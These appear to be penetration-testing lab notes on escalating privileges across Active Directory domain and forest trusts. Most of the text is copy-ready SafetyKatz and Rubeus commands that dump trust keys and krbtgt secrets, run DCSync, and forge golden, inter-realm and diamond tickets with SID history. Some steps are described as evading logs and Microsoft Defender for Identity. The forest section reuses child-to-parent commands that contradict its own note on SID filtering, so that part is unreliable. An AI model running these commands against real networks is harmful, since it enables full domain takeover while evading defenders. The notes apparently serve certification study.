- Across Domains - Implicit two way trust relationship.
- Across Forests - Trust relationship needs to be established

# Across Domains
## Priv Esc - Enterprise Admins
- sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
- sIDHistory can be abused in two ways of escalating privileges within a forest:
	- krbtgt hash of the child
	- Trust tickets

- Kerberos - Across Domain Trusts
![[Kerberos - Across Domain Trusts.png]]
### Priv Esc - Child to Parent using Trust Tickets
- So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent on the DC.
```
SafetyKatz.exe "lsadump::trust /patch"
or
SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$"
or
SafetyKatz.exe "lsadump::lsa /patch"
```
- Forge an inter-realm TGT using Rubeus
```
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```
- Use the forged ticket
```
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>
```

### Priv Esc - Enterprise Admins - krbtgt Secret Abuse
- This is easier!
- We need to simply forge a Golden ticket (not an inter-realm TGT) with sIDHistory of the Enterprise Admins group.
- Due to the trust, the parent domain will trust the TGT.
```
SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

- Avoid suspicious logs and bypass MDI by using Domain Controller identity
```
SafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"


SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```
- S-1-5-21-2578538781-2508153159-3419410681-516 - Domain Controllers
- S-1-5-9 - Enterprise Domain Controllers

- Avoid suspicious logs and bypass MDI by using Domain Controller identity (using Rubeus)
```
Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt


SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

- Diamond ticket with SID History will avoid suspicious logs on child DC and parent DC. Also bypasses MDI:
```
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt


SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

# Across Forests
- Across the trust any SIDhistory between 500 and 1000 will be filtered. That means we cannot escalate to enterprise admins across trust
- We require the trust key for the inter-forest trust from the DC that has the external trust:
```
SafetyKatz.exe -Command '"lsadump::trust /patch"'
or
SafetyKatz.exe -Command '"lsadump::lsa /patch"'
```
- Forge an inter-realm TGT using Rubeus
```
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```
- Use the forged ticket
```
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>
```
